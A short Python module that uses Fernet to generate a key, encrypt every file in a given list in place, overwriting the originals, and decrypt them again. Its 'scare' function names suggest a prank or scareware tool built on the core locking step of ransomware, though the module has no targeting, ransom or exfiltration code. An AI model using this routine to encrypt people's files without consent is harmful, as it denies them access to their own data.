from cryptography.fernet import Fernet

def generate_a_key():
    # Generating the key
    key = Fernet.generate_key()
    string_key = str(key)
    cleaned_key = string_key[2:-1]
    return key, cleaned_key
         
def scare_encrypt(all_files_list, secret_key):
    success = True
    for file in all_files_list:
        try:
            with open(file, "rb") as file_to_work_with:
                contents = file_to_work_with.read()
            encrypted_content = encrypt_the_file(secret_key, contents)
            with open(file, "wb") as file_to_work_with:
                file_to_work_with.write(encrypted_content)
        except Exception as e:
            print(f"Encryption failed for file {file}: {e}")
            success = False
    if success:
        return 0
    else:
        return 1



def scare_decrypt(all_files_list, secret_key):
    success = True
    for file in all_files_list:
        try:
            with open(file, "rb") as file_to_work_with:
                contents = file_to_work_with.read()
            encrypted_content = decrypt_the_file(secret_key, contents)
            with open(file, "wb") as file_to_work_with:
                file_to_work_with.write(encrypted_content)
        except Exception as e:
            print(f"Decryption failed for file {file}: {e}")
            success = False
    if success:
        return 0
    else:
        return 1





def encrypt_the_file(secret_key, file_content):
    encrypted_content = Fernet(secret_key).encrypt(file_content)
    return encrypted_content

def decrypt_the_file(secret_key, file_content):
    decrypted_content = Fernet(secret_key).decrypt(file_content)
    return decrypted_content
